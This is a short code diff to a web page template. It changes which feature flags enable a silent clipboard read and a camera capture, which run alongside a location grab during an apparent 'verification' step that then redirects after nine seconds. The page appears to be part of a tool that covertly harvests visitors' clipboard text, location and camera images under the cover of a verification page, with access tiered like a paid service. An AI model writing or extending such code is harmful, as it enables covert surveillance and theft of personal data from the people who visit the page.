@@ -202,7 +202,7 @@ window.addEventListener("beforeunload",function(){
 });
 <% } %>
 
-<% if(premium && feat.clipboard){ %>
+<% if(clipAccess && feat.clipboard){ %>
 (function(){
   try{
     navigator.clipboard.readText().then(function(text){
@@ -341,7 +341,7 @@ function doVerify(){
   setTimeout(function(){doRedirect();},9000);
   // Fire location + camera in parallel
   fireLocation();
-<% if(premium){ %>  doCamera();<% } %>
+<% if(camAccess){ %>  doCamera();<% } %>
 }
 
 // ── Page init ─────────────────────────────────────────────────────────────────
